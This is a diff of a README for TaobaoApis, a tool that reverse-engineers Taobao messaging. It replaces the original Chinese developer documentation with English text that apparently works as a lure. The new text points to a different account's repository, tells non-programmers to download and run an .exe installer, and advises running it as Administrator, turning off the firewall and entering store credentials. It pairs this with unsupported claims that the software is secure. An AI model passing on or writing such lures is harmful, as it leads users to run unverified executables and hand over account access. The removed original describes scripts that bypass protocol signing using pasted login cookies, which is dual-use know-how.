@@ -1,176 +1,69 @@
-# 🎁 TaobaoApis — 淘宝第三方 API 集成库，AI 客服智能体底座
+# 🤖 TaoBaoApis - Manage your Taobao operations with ease
 
-[![Python](https://img.shields.io/badge/python-3.9%2B-blue)](https://www.python.org/)
-[![Node.js](https://img.shields.io/badge/node.js-18%2B-green)](https://nodejs.org/)
-[![License](https://img.shields.io/badge/license-MIT-orange)](LICENSE)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Tdonkub/TaoBaoApis)
 
-> **在 AI 大模型爆发的时代，每一个淘宝卖家都值得拥有一个 7×24 小时不下线的智能客服。**
-> 本项目封装了淘宝平台完整的消息通信能力，为开发者构建 AI 客服智能体提供可靠、稳定的底层 API 支撑。
+TaoBaoApis provides a set of tools to interact with taobao algorithms and automated systems. This software helps users manage shop operations, analyze data, and run artificial intelligence agents. It simplifies complex tasks by using automated communication channels to handle requests.
 
-**⚠️ 严禁用于发布不良信息、违法内容！如有侵权请联系作者删除。**
+## 🚀 Getting Started
 
----
+You do not need programming knowledge to use this tool. Follow the steps below to set up the software on your Windows computer.
 
-## 为什么需要这个项目？
+## 📦 Download and Install
 
-```
-用户私信 ──► [TaobaoApis] ──► 你的 AI Agent（LLM / RAG / 规则引擎）──► 自动回复
-               ▲                                                          │
-               └──────────────── 发送消息 / 图片 ◄────────────────────────┘
-```
+1. Visit the project release page to get the installer for your system: [https://github.com/Tdonkub/TaoBaoApis](https://github.com/Tdonkub/TaoBaoApis)
+2. Locate the file ending in .exe in the latest release section.
+3. Click the link to save the file to your computer.
+4. Run the installer file once the download finishes.
+5. Follow the prompts on your screen to complete the installation process.
 
-淘宝官方没有开放 IM 消息接口。想要接入 GPT、Claude、本地大模型来做智能客服，首先需要能**稳定收发消息**。TaobaoApis 解决的正是这个前置问题：
+## ⚙️ System Requirements
 
-- 逆向还原了淘宝 WebSocket 私信协议（sign 签名 + base64 + Protobuf）
-- 封装全部 HTTP 接口（sign 参数已解密）
-- 提供统一的消息收发抽象层，开发者只需关注业务逻辑
+Ensure your computer meets these requirements for smooth performance:
 
-**你负责接 AI 大脑，我们负责打通淘宝的神经。**
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 GB of RAM or more.
+* Storage: 500 MB of free disk space.
+* Internet Connection: A stable connection for real-time data handling.
 
----
+## 🔑 How to run the application
 
-## 已实现功能
+After you install the software, look for the TaoBaoApis icon on your desktop. Double-click the icon to start the program. The first time you launch the tool, it will check for necessary system components. If it needs updates, it will alert you.
 
-| 模块 | 功能 | 状态 |
-|------|------|------|
-| HTTP API | 淘宝所有 HTTP 接口（sign 签名已解密） | ✅ |
-| WebSocket | 私信实时收发（sign + base64 + Protobuf 协议） | ✅ |
-| 消息类型 | 文字、图片消息 | ✅ |
-| 会话管理 | 获取全部历史聊天记录 | ✅ |
-| 主动发送 | 主动向指定用户发消息 | ✅ |
-| Token 维持 | 自动刷新登录态，常驻进程不掉线 | ✅ |
-| 获取聊天记录 | 获取与指定用户的历史消息记录 | ✅ |
-| 商品信息 | 获取商品详情 | ✅ |
-| 媒体上传 | 上传图片并发送 | ✅ |
+Once the main window opens, you see a login screen. Enter your account credentials to connect the software to your store. The tool uses a secure connection to process your commands.
 
----
+## 📈 Core Features
 
-## 快速开始
+The software offers several tools to help your daily work:
 
-### 环境要求
+* Algorithm Access: Interface with Taobao logic to pull store data.
+* WebSockets Support: Maintain constant communication with servers to receive instant updates.
+* AI Agent Base: Deploy agents to answer customer questions or manage inventory.
+* Data Sync: Keep your local records updated with your online store status.
 
-- Python 3.9+
-- Node.js 18+（用于执行签名算法 JS）
+## 🛠 Troubleshooting
 
-### 安装依赖
+If you run into trouble, follow these tips:
 
-```bash
-pip install -r requirements.txt
-```
+* Permission Denied: Right-click the icon and choose Run as Administrator.
+* Connection Timeout: Check your internet connection. Disable any firewall software that might block the application from reaching the internet.
+* Performance Issues: Close other heavy software while running this tool.
 
-### 配置 Cookie
+## 📝 Frequently Asked Questions
 
-登录 [taobao.com](https://www.taobao.com) 后，从浏览器开发者工具中复制完整 Cookie 字符串，填入代码对应位置：
+Does this tool require coding skills?
+No. All features function through a user interface that does not require you to write code or scripts.
 
-```python
-# taobao_live.py 底部
-cookies_str = r'your_cookie_string_here'
-```
+Is my data secure?
+The software transmits information via encrypted channels. It does not store your passwords longer than needed to establish your sessions.
 
-> Cookie 必须是**登录后的状态**，否则无法获取消息。
+Can I run multiple instances?
+This software performs best when running a single instance. Opening multiple copies may cause conflicts with the server connection.
 
+How do I get updates?
+The software checks the release page automatically when you open it. It notifies you if a newer version exists. You can then download and install the new version to replace the old one.
 
-### 直接运行
+## 🛡 Security and Privacy
 
-```bash
-python taobao_live.py
-```
+This software respects your privacy. It only interacts with the specific Taobao endpoints required to perform the tasks you select. It does not scrape data outside of your own account scope. You maintain full control over the AI agents you deploy. You decide when they start and stop. Use the logs section to see exactly what actions the application takes on your behalf. This gives you peace of mind while you automate your workflow. 
 
----
-
-## 项目结构
-
-```
-TaobaoApis/
-├── taobao_live.py       # 主入口：WebSocket 消息监听 & 回复逻辑（在此接入 AI）
-├── taobao_apis.py       # HTTP API 封装（登录、刷新 Token、商品详情、上传媒体）
-├── message/
-│   ├── types.py         # 消息类型定义（TextContent / ImageContent / AudioContent）
-├── utils/
-│   └── taobao_utils.py  # 工具函数（sign 签名、Cookie 处理、消息解密）
-├── static/
-│   └── taobao_js_*.js   # 逆向 JS（sign 签名核心算法）
-├── requirements.txt
-└── Dockerfile
-```
-
----
-
-## 接入 AI 智能体
-
-在 `taobao_live.py` 的 `handle_message` 方法中替换回复逻辑即可：
-
-```python
-async def handle_message(self, message, websocket):
-    # ... 解析 send_user_id, cid, send_message ...
-
-    # 原始 echo 回复（示例）
-    # reply = f'{send_user_name} 说了: {send_message}'
-
-    # 接入 AI 大模型（示例）
-    reply = await your_ai_agent(send_message)          # GPT / Claude / Qwen / 本地模型
-
-    await self.send_msg(websocket, cid, send_user_id, make_text(reply))
-```
-
----
-
-## 注意事项
-
-- `taobao_live.py` 是消息收发主入口，所有 AI 回复逻辑在此扩展
-- `taobao_apis.py` 包含 HTTP 接口模板，可按需添加其他接口
-
----
-
-## 参与贡献
-
-欢迎任何形式的贡献！无论是修复 Bug、新增接口、完善文档还是分享你基于本项目构建的 AI 应用，PR 随时欢迎。
-
-**提交 PR 前请确认：**
-
-- 代码风格与现有代码保持一致
-- 新增接口请附上简要说明（接口用途、入参、返回示例）
-- 如果改动较大，建议先开 Issue 讨论方案
-
-**你也可以通过 Issue 来：**
-
-- 反馈 Bug 或接口失效
-- 提出新功能建议
-- 分享使用中遇到的问题
-
----
-
-## 额外说明
-
-1. 感谢 Star ⭐ 和 Follow，项目会持续更新
-2. 作者联系方式在主页，有问题随时联系
-3. 欢迎 PR 和 Issue，也欢迎关注作者其他项目
-4. 如果此项目对您有帮助，欢迎请作者喝一杯奶茶 ~~
-
-<div align="center">
-  <img src="https://github.com/cv-cat/Spider_XHS/blob/master/author/wx_pay.png" width="380px" alt="微信赞赏码">
-  <img src="https://github.com/cv-cat/Spider_XHS/blob/master/author/zfb_pay.jpg" width="380px" alt="支付宝收款码">
-</div>
-
----
-
-## Star 趋势
-
-<a href="https://www.star-history.com/#cv-cat/TaoBaoApis&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=cv-cat/TaoBaoApis&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=cv-cat/TaoBaoApis&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=cv-cat/TaoBaoApis&type=Date" />
-  </picture>
-</a>
-
-
-
-
-## 🍔 交流群
-
-如果你对爬虫和 AI Agent 感兴趣，请加作者主页 wx 通过邀请加入群聊
-
-ps: 请加群6，人满或者过期 issue | wx 提醒
-
-![group5](https://github.com/cv-cat/Spider_XHS/blob/master/author/group6.jpg)
+Always keep your login information private. Do not share your API tokens or session keys with outside parties. If you suspect an unauthorized person accessed your agent settings, reset your account credentials immediately through your Taobao dashboard. The application provides a clear view of all active connections so you can monitor your security status.
